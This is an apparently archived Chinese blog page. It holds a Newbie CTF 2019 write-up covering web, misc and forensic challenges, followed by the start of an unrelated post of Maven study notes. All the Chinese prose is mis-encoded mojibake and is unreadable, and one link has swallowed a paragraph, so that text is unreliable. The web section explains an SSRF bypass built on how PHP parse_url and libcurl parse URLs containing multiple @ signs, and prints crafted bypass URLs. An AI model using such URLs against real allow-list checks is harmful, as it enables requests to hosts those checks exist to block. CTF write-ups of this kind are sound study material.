<p>parse_urlä¸libcurlå¯¹ä¸urlçš„è§£æå·®å¼‚å¯èƒ½å¯¼è‡´ssrfå½“urlä¸­æœ‰å¤šä¸ª@ç¬¦å·æ—¶ï¼Œparse_urlä¸­è·å–çš„hostæ˜¯æœ€åä¸€ä¸ª@ç¬¦å·åé¢çš„hostï¼Œè€Œlibcurlåˆ™æ˜¯è·å–çš„ç¬¬ä¸€ä¸ª@ç¬¦å·ä¹‹åçš„ã€‚å› æ­¤å½“ä»£ç å¯¹<a href="http://user@eval.com:80@baidu.comè¿›è¡Œè§£ææ—¶ï¼ŒPHPè·å–çš„hostæ˜¯baidu.comæ˜¯å…è®¸è®¿é—®çš„åŸŸåï¼Œè€Œæœ€åè°ƒç”¨libcurlè¿›è¡Œè¯·æ±‚æ—¶åˆ™æ˜¯è¯·æ±‚çš„eval.comåŸŸåï¼Œå¯ä»¥é€ æˆssrfç»•è¿‡æ­¤å¤–å¯¹äºhttps://evil@baidu.comè¿™æ ·çš„åŸŸåè¿›è¡Œè§£ææ—¶,phpè·å–çš„hostæ˜¯evil@baidu.comï¼Œä½†æ˜¯libcurlè·å–çš„hostå´æ˜¯evil.com" target="_blank" rel="noopener">http://user@eval.com:80@baidu.comè¿›è¡Œè§£ææ—¶ï¼ŒPHPè·å–çš„hostæ˜¯baidu.comæ˜¯å…è®¸è®¿é—®çš„åŸŸåï¼Œè€Œæœ€åè°ƒç”¨libcurlè¿›è¡Œè¯·æ±‚æ—¶åˆ™æ˜¯è¯·æ±‚çš„eval.comåŸŸåï¼Œå¯ä»¥é€ æˆssrfç»•è¿‡æ­¤å¤–å¯¹äºhttps://evil@baidu.comè¿™æ ·çš„åŸŸåè¿›è¡Œè§£ææ—¶,phpè·å–çš„hostæ˜¯evil@baidu.comï¼Œä½†æ˜¯libcurlè·å–çš„hostå´æ˜¯evil.com</a> </p>
<p>from  <a href="https://paper.seebug.org/561" target="_blank" rel="noopener">https://paper.seebug.org/561</a> </p>
</blockquote>
<p>æ„é€ url:<code>user@4399.com@normalflag.iwinv.net</code>(æˆ‘æ˜¯æ¥å¸®4399æ‰“å¹¿å‘Šçš„:v:)â€‹</p>
<p>KorNewbie{H0$7_$P1it_A774cK_U$3s_N0RM^liZ47ioN&amp;##$%%!}</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="catch-me"><a href="#catch-me" class="headerlink" title="catch me"></a>catch me</h3><p>åˆ©ç”¨å·¥å…·é€å¸§æŸ¥çœ‹ï¼ŒæŠŠæ¯ä¸ªå­å‡ºç°çš„ä½ç½®è®°å½•è½¬æˆasciiç å¾—åˆ°flag</p>
<p>KorNewbie{w0w_e4g1e_3y3}</p>
<h3 id="BiMilCode"><a href="#BiMilCode" class="headerlink" title="BiMilCode"></a>BiMilCode</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8kovw3cl4j30e704pt8u.jpg" alt="image.png"></p>
<p>åˆšå¼€å§‹é¢˜ç›®è¯´è¦encodeã€‚ç»“æœè¢«è¿™ä¸ªè¯¯è§£æäº†ä¸€ä¸ªå°æ—¶æ‰å‘ç°æ˜¯decode</p>
<p>è§‚å¯Ÿå‘ç°ä¸€ä¸ªå­—ç¬¦ä¼šè¢«ç¼–ç æˆ2ä½çš„16è¿›åˆ¶çš„æ•°æ®</p>
<p>è®¤çœŸè§‚å¯Ÿå‘ç°ç¼–ç æ–¹å¼è¿˜å’Œä½ç½®æœ‰å…³ï¼Œä½†æ˜¯ç›¸åŒçš„ä½ç½®ç¼–ç æ–¹å¼ç›¸åŒ,è€Œä¸”åªæ˜¯å¯¹asciiç è¿›è¡Œç§»ä½</p>
<p>ä¹Ÿå°±æ˜¯è¯´,åœ¨åŒä¸€ä¸ªä¼šè¯é‡Œ,æˆ‘ä»¬å¯ä»¥é€šè¿‡asciiç çš„å·®å€¼æ¥å¾—åˆ°æ¥è®¡ç®—å‡ºé¢˜ç›®ç»™å‡ºçš„ç¼–ç åçš„å­—ç¬¦ä¸²</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kp8m10vej30ep058jrl.jpg" alt="image.png"></p>
<pre><code class="python">s2=&#39;45 dd 97 38 62 6c 62 85&#39;.split(&#39; &#39;)
s1=&#39;3a 93 78 3a 6c 63 3a 63&#39;.split(&#39; &#39;)
print(s1)
print(s2)
for i in range(len(s1)):
    print(chr(ord(&#39;0&#39;)+int(s1[i],16)-int(s2[i],16)),end=&#39;&#39;)</code></pre>
<p>KorNewbie{Nace_I_believed_it}</p>
<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="find-the-plain"><a href="#find-the-plain" class="headerlink" title="find the plain"></a>find the plain</h3><p>é¢˜ç›®æè¿°</p>
<blockquote>
<p>Alpha teamâ€™s whistleblower captured a packet that leaked internal information to the outside using ftp internal confidential data.</p>
<p>Analyze the packet and flag the password and information obtained for the ftp connection!</p>
<p>flag format : KorNewbie{password_yougetinformation}</p>
<p>â€» If there is a hash value, it will be md5.</p>
</blockquote>
<p>ç”¨<code>(!frame.len== 1518) &amp;&amp;(!frame.len== 1514)&amp;&amp; (! ip.addr==192.229.232.240) &amp;&amp; (not tcp.stream==2) &amp;&amp; (not tcp.stream==0)&amp;&amp; (not tcp.stream==1)</code></p>
<p>è¿‡æ»¤æ‰¾åˆ°ftpä¼ è¾“æ–‡ä»¶å’Œè´¦å·å¯†ç </p>
<p>password:root</p>
<p>badguy.txt</p>
<pre><code>7J2067O06rKMIOyVjO2MjO2MgOydmCDsi6Dsg4HsoJXrs7TripQg67CR7J2YIOyjvOyGjOyXkCDrqqjrkZAg64u07JWE64aT7JWY64SkLiDqsbTtiKzrpbwg67mM7KeA7JuM7YSwLi4gDQpodHRwczovL3Bhc3RlYmluLmNvbS83MHlER2lSUw==</code></pre><p>decodeå¾—åˆ°</p>
<pre><code>ì´ë³´ê²Œ ì•ŒíŒŒíŒ€ì˜ ì‹ ìƒì •ë³´ëŠ” ë°‘ì˜ ì£¼ì†Œì— ëª¨ë‘ ë‹´ì•„ë†“ì•˜ë„¤. ê±´íˆ¬ë¥¼ ë¹Œì§€ì›Œí„°.. 
//alphaç»„çš„ä¸ªäººä¿¡æ¯å…¨éƒ¨æ”¾åœ¨ä¸‹é¢çš„åœ°å€é‡Œã€‚ç¥ä½ æˆåŠŸ..
https://pastebin.com/70yDGiRS</code></pre><p><code>k459iki6m5j094m2lmkhjmi9527l81ml</code></p>
<p>é¢˜ç›®æç¤ºå¾—åˆ°çš„ä¸€ä¸ªä¿¡æ¯æ˜¯md5</p>
<p>æ‰€ä»¥å¯¹è¿™ä¸ªè¿›è¡Œå‡¯æ’’å¯†ç è§£å¯†å¾—åˆ°<code>d459bdb6f5c094f2efdacfb9527e81fe</code></p>
<p>åé¢å‘ç°<img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k0vd6qapj30ue015gli.jpg" alt="image.png"></p>
<p>è¿™é‡Œä¹Ÿæç¤ºäº†å‡¯æ’’åŠ å¯†</p>
<p>ä½†æ˜¯ç”¨å›½å†…çš„md5è§£å¯†ç½‘ç«™æ— è®ºå¦‚ä½•ä¹Ÿç ´ä¸äº†</p>
<p>ç”¨æœé²œè¯­æœäº†ä¸€ä¸‹å°±è§£å¯†äº†</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8k0ww99j0j30j6036t8w.jpg" alt="image.png"></p>
<p>KorNewbie{root_IronDragon}</p>
<p>â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</p>
<p>è¿™æ˜¯ä¸ªæ¢—å—.</p>
<h3 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h3><p>é¢˜ç›®æè¿°</p>
<blockquote>
<p>Confidential information came and went through chat. Find the email of the user who used the chat. </p>
</blockquote>
<p>user:NewbieCTF2019</p>
<p>åœ¨youtubeæ‰¾åˆ°ä¸€ä¸ªå¥½ç©çš„é‡ç½®å¯†ç çš„æ–¹æ³•</p>
<p> <a href="https://www.youtube.com/watch?v=YBFAzK9mgNI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=YBFAzK9mgNI</a> </p>
<p>æ ¹æ®è¿™ä¸ªæ¥é‡ç½®å¯†ç </p>
<p>é‡ç½®å¯†ç åçœ‹ç€æ£’å­æ–‡æˆ‘æ˜¯æ‡µé€¼çš„(åŒä¼´+1)</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kph085tzj31gw0see6k.jpg" alt="image.png"></p>
<p>æ ¹æ®é¢˜ç›®æç¤ºèŠå¤©è½¯ä»¶ç†æ‰€å½“ç„¶çš„ç›¯ä¸Šäº†kakao</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kppnap1sj30wj0b60u7.jpg" alt="image.png"></p>
<p>è·‘åˆ°æ–‡ä»¶å¤¹é‡Œç¿»ä¸€ç¿»(ä¹Ÿå¯ä»¥å†™ä¸ªè„šæœ¬/fad)</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kpqxb2njj30tz0j8my5.jpg" alt="image.png"></p>
<p>æœ€åæ‹¿åˆ°flag</p>
<p><code>KorNewbie{renek@it-simple.net}</code></p>
<h3 id="rec"><a href="#rec" class="headerlink" title="rec"></a>rec</h3><p>è¿™é¢˜è·Ÿè¿›å»è°ƒè¯•ä¹Ÿæ²¡çœ‹åˆ°å•¥ï¼Œæƒ³æ¥æƒ³å»é˜²æ­¢å–è¯é¢˜çš„åœ°æ–¹æ€ä¹ˆä¹Ÿä¸å¯èƒ½æ˜¯é€†å‘å•¥çš„ã€</p>
<p>äºæ˜¯å°±å¼€å§‹ç”¨binwalk,stringsâ€¦..</p>
<p>æœ€åç¿»ä¸€ç¿»æ‰¾åˆ°äº†segæ®µâ€¦â€¦â€¦â€¦</p>
<p>åœ¨segæ®µæ‰¾åˆ°</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k2xe25wlj30io0gbdio.jpg" alt="image.png"></p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://www.ccreater.top/1970/01/01/nbctf/">https://www.ccreater.top/1970/01/01/nbctf/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/nbctf/" data-id="ckmn575780066s1ni5t49hvps" data-title="newbie ctf 2019" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-mavenå­¦ä¹ ç¬”è®°" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">ç¼–ç¨‹</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">mavenå­¦ä¹ ç¬”è®°</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="mavenå­¦ä¹ ç¬”è®°"><a href="#mavenå­¦ä¹ ç¬”è®°" class="headerlink" title="mavenå­¦ä¹ ç¬”è®°"></a>mavenå­¦ä¹ ç¬”è®°</h1><h2 id="å­¦ä¹ ç½‘ç«™"><a href="#å­¦ä¹ ç½‘ç«™" class="headerlink" title="å­¦ä¹ ç½‘ç«™"></a>å­¦ä¹ ç½‘ç«™</h2><p> <a href="https://www.imooc.com/learn/443" target="_blank" rel="noopener">https://www.imooc.com/learn/443</a> (è¿™ä¸ªæŒºå¥½çš„)</p>
<p> <a href="https://www.runoob.com/maven/maven-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/maven/maven-tutorial.html</a> </p>
<h2 id="mavenåŠŸèƒ½"><a href="#mavenåŠŸèƒ½" class="headerlink" title="mavenåŠŸèƒ½"></a>mavenåŠŸèƒ½</h2><ul>
<li>æ„å»º</li>
<li>æ–‡æ¡£ç”Ÿæˆ</li>
<li>æŠ¥å‘Š</li>
<li>ä¾èµ–</li>
<li>SCMs</li>
<li>å‘å¸ƒ</li>
<li>åˆ†å‘</li>
<li>é‚®ä»¶åˆ—è¡¨</li>
</ul>
<h2 id="çº¦å®šé…ç½®"><a href="#çº¦å®šé…ç½®" class="headerlink" title="çº¦å®šé…ç½®"></a>çº¦å®šé…ç½®</h2><p>Maven æå€¡ä½¿ç”¨ä¸€ä¸ªå…±åŒçš„æ ‡å‡†ç›®å½•ç»“æ„ï¼ŒMaven ä½¿ç”¨çº¦å®šä¼˜äºé…ç½®çš„åŸåˆ™ï¼Œå¤§å®¶å°½å¯èƒ½çš„éµå®ˆè¿™æ ·çš„ç›®å½•ç»“æ„ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<table>
<thead>
<tr>
<th align="left">ç›®å½•</th>
<th align="left">ç›®çš„</th>
</tr>
</thead>
<tbody><tr>
<td align="left">${basedir}</td>
<td align="left">å­˜æ”¾pom.xmlå’Œæ‰€æœ‰çš„å­ç›®å½•</td>
</tr>
<tr>
<td align="left">${basedir}/src/main/java</td>
<td align="left">é¡¹ç›®çš„javaæºä»£ç </td>
</tr>
<tr>
<td align="left">${basedir}/src/main/resources</td>
<td align="left">é¡¹ç›®çš„èµ„æºï¼Œæ¯”å¦‚è¯´propertyæ–‡ä»¶ï¼Œspringmvc.xml</td>
</tr>
<tr>
<td align="left">${basedir}/src/test/java</td>
<td align="left">é¡¹ç›®çš„æµ‹è¯•ç±»ï¼Œæ¯”å¦‚è¯´Junitä»£ç </td>
</tr>
<tr>
<td align="left">${basedir}/src/test/resources</td>
<td align="left">æµ‹è¯•ç”¨çš„èµ„æº</td>
</tr>
<tr>
<td align="left">${basedir}/src/main/webapp/WEB-INF</td>
<td align="left">webåº”ç”¨æ–‡ä»¶ç›®å½•ï¼Œwebé¡¹ç›®çš„ä¿¡æ¯ï¼Œæ¯”å¦‚å­˜æ”¾web.xmlã€æœ¬åœ°å›¾ç‰‡ã€jspè§†å›¾é¡µé¢</td>
</tr>
<tr>
<td align="left">${basedir}/target</td>
<td align="left">æ‰“åŒ…è¾“å‡ºç›®å½•</td>
</tr>
<tr>
<td align="left">${basedir}/target/classes</td>
<td align="left">ç¼–è¯‘è¾“å‡ºç›®å½•</td>
</tr>
<tr>
<td align="left">${basedir}/target/test-classes</td>
<td align="left">æµ‹è¯•ç¼–è¯‘è¾“å‡ºç›®å½•</td>
</tr>
<tr>
<td align="left">Test.java</td>
<td align="left">Mavenåªä¼šè‡ªåŠ¨è¿è¡Œç¬¦åˆè¯¥å‘½åè§„åˆ™çš„æµ‹è¯•ç±»</td>
</tr>
<tr>
<td align="left">~/.m2/repository</td>
<td align="left">Mavené»˜è®¤çš„æœ¬åœ°ä»“åº“ç›®å½•ä½ç½®</td>
</tr>
</tbody></table>
<h2 id="Maven-POM"><a href="#Maven-POM" class="headerlink" title="Maven POM"></a>Maven POM</h2><p> POM( Project Object Modelï¼Œé¡¹ç›®å¯¹è±¡æ¨¡å‹ ) æ˜¯ Maven å·¥ç¨‹çš„åŸºæœ¬å·¥ä½œå•å…ƒï¼Œæ˜¯ä¸€ä¸ªXMLæ–‡ä»¶ ,ç”¨äºæè¿°å¦‚ä½•æ„å»ºé¡¹ç›®</p>
<p>åœ¨åˆ›å»º POM ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æè¿°é¡¹ç›®ç»„ (groupId), é¡¹ç›®çš„å”¯ä¸€IDã€‚ </p>
<h3 id="æ¨¡æ¿"><a href="#æ¨¡æ¿" class="headerlink" title="æ¨¡æ¿"></a>æ¨¡æ¿</h3><pre><code class="xml">&lt;project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot;
    xmlns:xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot;
    xsi:schemaLocation = &quot;http://maven.apache.org/POM/4.0.0
    http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;

    &lt;!-- æ¨¡å‹ç‰ˆæœ¬ --&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;!-- å…¬å¸æˆ–è€…ç»„ç»‡çš„å”¯ä¸€æ ‡å¿—ï¼Œå¹¶ä¸”é…ç½®æ—¶ç”Ÿæˆçš„è·¯å¾„ä¹Ÿæ˜¯ç”±æ­¤ç”Ÿæˆï¼Œ å¦‚com.companyname.project-groupï¼Œmavenä¼šå°†è¯¥é¡¹ç›®æ‰“æˆçš„jaråŒ…æ”¾æœ¬åœ°è·¯å¾„ï¼š/com/companyname/project-group --&gt;
    &lt;groupId&gt;com.companyname.project-group(å…¬å¸ç½‘ç«™åå†™+é¡¹ç›®å)&lt;/groupId&gt;

    &lt;!-- é¡¹ç›®çš„å”¯ä¸€IDï¼Œä¸€ä¸ªgroupIdä¸‹é¢å¯èƒ½å¤šä¸ªé¡¹ç›®ï¼Œå°±æ˜¯é artifactIdæ¥åŒºåˆ†çš„ --&gt;
    &lt;artifactId&gt;project+æ¨¡å—å&lt;/artifactId&gt;

    &lt;!-- ç‰ˆæœ¬å· --&gt;
    &lt;version&gt;1.0&lt;/version&gt;
&lt;/project&gt;</code></pre>
<h3 id="å¸¸è§æ ‡ç­¾è§£é‡Š"><a href="#å¸¸è§æ ‡ç­¾è§£é‡Š" class="headerlink" title="å¸¸è§æ ‡ç­¾è§£é‡Š"></a>å¸¸è§æ ‡ç­¾è§£é‡Š</h3><pre><code class="xml">&lt;project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot;
    xmlns:xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot;
    xsi:schemaLocation = &quot;http://maven.apache.org/POM/4.0.0
    http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;

    &lt;!-- æ¨¡å‹ç‰ˆæœ¬ --&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;!-- å…¬å¸æˆ–è€…ç»„ç»‡çš„å”¯ä¸€æ ‡å¿—ï¼Œå¹¶ä¸”é…ç½®æ—¶ç”Ÿæˆçš„è·¯å¾„ä¹Ÿæ˜¯ç”±æ­¤ç”Ÿæˆï¼Œ å¦‚com.companyname.project-groupï¼Œmavenä¼šå°†è¯¥é¡¹ç›®æ‰“æˆçš„jaråŒ…æ”¾æœ¬åœ°è·¯å¾„ï¼š/com/companyname/project-group --&gt;
    &lt;groupId&gt;com.companyname.project-group(å…¬å¸ç½‘ç«™åå†™+é¡¹ç›®å)&lt;/groupId&gt;

    &lt;!-- é¡¹ç›®çš„å”¯ä¸€IDï¼Œä¸€ä¸ªgroupIdä¸‹é¢å¯èƒ½å¤šä¸ªé¡¹ç›®ï¼Œå°±æ˜¯é artifactIdæ¥åŒºåˆ†çš„ --&gt;
    &lt;artifactId&gt;project+æ¨¡å—å&lt;/artifactId&gt;

    &lt;!-- ç‰ˆæœ¬å·
     ç¬¬ä¸€ä¸ªæ•°å­—è¡¨ç¤ºå¤§ç‰ˆæœ¬å·
    ç¬¬äºŒä¸ªæ•°å­—è¡¨ç¤ºåˆ†æ”¯ç‰ˆæœ¬å·
    ç¬¬ä¸‰ä¸ªæ•°å­—è¡¨ç¤ºå°ç‰ˆæœ¬å·
    snapshot å¿«ç…§
    alpha å†…éƒ¨æµ‹è¯•
    beta å…¬æµ‹
    Release ç¨³å®šç‰ˆæœ¬
    GA æ­£å¼å‘å¸ƒ
    --&gt;
    &lt;version&gt;1.0.0-xxx&lt;/version&gt;
    &lt;!-- æ‰“åŒ…æ–¹å¼ï¼Œé»˜è®¤æ˜¯jar,è¿˜æœ‰:war zip pom--&gt;
    &lt;packaging&gt;&lt;/packaging&gt;
    &lt;!--é¡¹ç›®æè¿°å--&gt;
    &lt;name&gt;&lt;/name&gt;
    &lt;!--é¡¹ç›®åœ°å€ --&gt;
    &lt;url&gt;&lt;/url&gt;
    &lt;!--é¡¹ç›®æè¿° --&gt;
    &lt;descriptions&gt;&lt;/descriptions&gt;
    &lt;!--å¼€å‘äººå‘˜ä¿¡æ¯ --&gt;
    &lt;developers&gt;&lt;/developers&gt;
    &lt;dependeies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.companyname.project-group(å…¬å¸ç½‘ç«™åå†™+é¡¹ç›®å)&lt;/groupId&gt;

            &lt;artifactId&gt;project+æ¨¡å—å&lt;/artifactId&gt;
            &lt;version&gt;1.0.0-xxx&lt;/version&gt;
            &lt;type&gt;&lt;/type&gt;
            &lt;!-- åœ¨testä¸­æœ‰ç”¨ --&gt;
            &lt;scope&gt;test&lt;/scope&gt;
            &lt;!--è®¾ç½®ä¾èµ–æ˜¯å¦å¯é€‰ï¼Œé»˜è®¤Falseï¼Œè®¾ä¸ºFalseåˆ™å­é¡¹ç›®é»˜è®¤ç»§æ‰¿ï¼Œå¦åˆ™å¾—æ˜¾ç¤ºå£°æ˜--&gt;
            &lt;optional&gt;&lt;/optional&gt;
            &lt;!-- æ’é™¤ä¾èµ–ä¼ é€’åˆ—è¡¨
                å¦‚Aä¾èµ–Bï¼ŒBä¾èµ–Cï¼Œè€ŒAä¸ä¾èµ–Cï¼Œæ­¤æ—¶å°±å¯ä»¥åœ¨æ­¤å¤„æ·»åŠ Cï¼Œæ¥æ’é™¤ä¾èµ–
             --&gt;

            &lt;exclusions&gt;
                &lt;exclusion&gt;
                &lt;/exclusion&gt;
            &lt;/exclusions&gt;
        &lt;/dependency&gt;
    &lt;/dependeies&gt;
    &lt;!-- ä¾èµ–çš„ç®¡ç†ï¼Œå­pomè‡ªåŠ¨ç»§æ‰¿ï¼Œä½†æ˜¯æœ¬èº«å¹¶ä¸ä¾èµ– --&gt;
    &lt;dependencyManagement&gt;
       &lt;dependeies&gt;
            &lt;dependency&gt;
           &lt;/dependency&gt;
        &lt;/dependeies&gt; 
    &lt;/dependencyManagement&gt;
    &lt;build&gt;
        &lt;plugins&gt;
            &lt;!-- è¯¦æƒ…è§åœ¨æŸä¸ªé˜¶æ®µä½¿ç”¨æ’ä»¶ --&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;
    &lt;!-- èšåˆè¿è¡Œå¤šä¸ªmavené¡¹ç›®,ä¸€å£æ°”å…¨éƒ¨ç¼–è¯‘ --&gt;
    &lt;modules&gt;
        &lt;module&gt;
        &lt;/module&gt;
    &lt;/modules&gt;
&lt;/project&gt;</code></pre>
<h3 id="æ‰§è¡Œmainå‡½æ•°"><a href="#æ‰§è¡Œmainå‡½æ•°" class="headerlink" title="æ‰§è¡Œmainå‡½æ•°"></a>æ‰§è¡Œmainå‡½æ•°</h3><p>åœ¨pomä¸‹çš„projectæ·»åŠ ï¼š</p>
<pre><code class="xml">&lt;build&gt;
 &lt;plugins&gt;
  &lt;plugin&gt;
   &lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;
   &lt;artifactId&gt;exec-maven-plugin&lt;/artifactId&gt;
   &lt;version&gt;1.1.1&lt;/version&gt;
   &lt;executions&gt;
    &lt;execution&gt;
     &lt;phase&gt;test&lt;/phase&gt;
     &lt;goals&gt;
      &lt;goal&gt;java&lt;/goal&gt;
     &lt;/goals&gt;
     &lt;configuration&gt;
      &lt;mainClass&gt;com.vineetmanohar.module.CodeGenerator&lt;/mainClass&gt;
      &lt;arguments&gt;
       &lt;argument&gt;arg0&lt;/argument&gt;
       &lt;argument&gt;arg1&lt;/argument&gt;
      &lt;/arguments&gt;
     &lt;/configuration&gt;
    &lt;/execution&gt;
   &lt;/executions&gt;
  &lt;/plugin&gt;
 &lt;/plugins&gt;
&lt;/build&gt;</code></pre>
<h3 id="ä¾èµ–èŒƒå›´"><a href="#ä¾èµ–èŒƒå›´" class="headerlink" title="ä¾èµ–èŒƒå›´"></a>ä¾èµ–èŒƒå›´</h3><ul>
<li>compile<br>é»˜è®¤çš„èŒƒå›´ï¼Œç¼–è¯‘æµ‹è¯•è¿è¡Œéƒ½æœ‰æ•ˆ</li>
<li>provided<br>åœ¨æµ‹è¯•å’Œç¼–è¯‘æ—¶æœ‰æ•ˆ</li>
<li>runtime<br>åœ¨æµ‹è¯•å’Œè¿è¡Œæ—¶æœ‰æ•ˆ</li>
<li>test<br>åªæœ‰åœ¨æµ‹è¯•ä¸­æœ‰æ•ˆ</li>
</ul>
<h3 id="æ’é™¤ä¾èµ–"><a href="#æ’é™¤ä¾èµ–" class="headerlink" title="æ’é™¤ä¾èµ–"></a>æ’é™¤ä¾èµ–</h3><p>åœ¨pomä¸­çš„projectä¸‹æ·»åŠ </p>
<pre><code class="xml">&lt;!-- æ’é™¤ä¾èµ–ä¼ é€’åˆ—è¡¨
                å¦‚Aä¾èµ–Bï¼ŒBä¾èµ–Cï¼Œè€ŒAä¸ä¾èµ–Cï¼Œæ­¤æ—¶å°±å¯ä»¥åœ¨æ­¤å¤„æ·»åŠ Cï¼Œæ¥æ’é™¤ä¾èµ–
             --&gt;

            &lt;exclusions&gt;
                &lt;exclusion&gt;
                &lt;/exclusion&gt;
            &lt;/exclusions&gt;</code></pre>
<h3 id="ä¾èµ–å†²çªè§£å†³åŸåˆ™"><a href="#ä¾èµ–å†²çªè§£å†³åŸåˆ™" class="headerlink" title="ä¾èµ–å†²çªè§£å†³åŸåˆ™"></a>ä¾èµ–å†²çªè§£å†³åŸåˆ™</h3><h4 id="çŸ­è·¯ä¼˜å…ˆ"><a href="#çŸ­è·¯ä¼˜å…ˆ" class="headerlink" title="çŸ­è·¯ä¼˜å…ˆ"></a>çŸ­è·¯ä¼˜å…ˆ</h4><pre><code>A -&gt; B -&gt; C -&gt; X1
A -&gt; D -&gt; X2
#A -&gt; Dä»£è¡¨ Aä¾èµ–äºD
æ­¤æ—¶Aä¾èµ–äºX2</code></pre><h4 id="å…ˆå£°æ˜å…ˆä¼˜å…ˆ"><a href="#å…ˆå£°æ˜å…ˆä¼˜å…ˆ" class="headerlink" title="å…ˆå£°æ˜å…ˆä¼˜å…ˆ"></a>å…ˆå£°æ˜å…ˆä¼˜å…ˆ</h4><p>å¦‚æœè·¯å¾„é•¿åº¦ç›¸åŒ(ä¾èµ–é“¾)ï¼Œåˆ™è°å…ˆå£°æ˜ï¼Œå…ˆè§£æè°</p>
<h3 id="èšåˆ"><a href="#èšåˆ" class="headerlink" title="èšåˆ"></a>èšåˆ</h3><p>åœ¨å®¹å™¨pomä¸­ä¿®æ”¹packagingä¸ºpomï¼Œæ·»åŠ modules</p>
<h4 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><p>ç°æœ‰mavené¡¹ç›®:maven01å’Œmaven02</p>
<p>æ–°å»ºmavené¡¹ç›®ï¼šmaven03,ä¸‰ä¸ªé¡¹ç›®å‡åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹</p>
<p>åœ¨maven03ä¸­ä¿®æ”¹packagingä¸ºpomï¼Œæ·»åŠ å¦‚ä¸‹modules</p>
<pre><code class="xml">&lt;modules&gt;
    &lt;module&gt;
        ../maven01
    &lt;/module&gt;
    &lt;module&gt;
        ../maven02
    &lt;/module&gt;
&lt;/modules&gt;</code></pre>
<h3 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h3><p>å½“å¤šä¸ªmavenæ¨¡å—éƒ½ä¾èµ–ä¸€ä¸ªç›¸åŒçš„åº“æ—¶ï¼Œå¤šæ¬¡å£°æ˜æ˜¾å¾—å¤ªéº»çƒ¦æ­¤æ—¶å¯ä»¥ç”¨ç»§æ‰¿æ¥è§£å†³</p>
<h4 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><p>ç°æœ‰ä¸¤ä¸ªmavené¡¹ç›®(maven01,maven02)éƒ½ä½¿ç”¨junit:3.8.1</p>
<p>æ–°å»ºçˆ¶mavené¡¹ç›®:maven03ï¼Œå…¶å¯¹åº”çš„pomæ–‡ä»¶ä¸ºï¼š</p>
<pre><code class="xml">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;

  &lt;groupId&gt;top.ccreater&lt;/groupId&gt;
  &lt;artifactId&gt;maven03&lt;/artifactId&gt;
  &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
  &lt;packaging&gt;pom&lt;/packaging&gt;

  &lt;name&gt;maven03&lt;/name&gt;
  &lt;url&gt;http://maven.apache.org&lt;/url&gt;

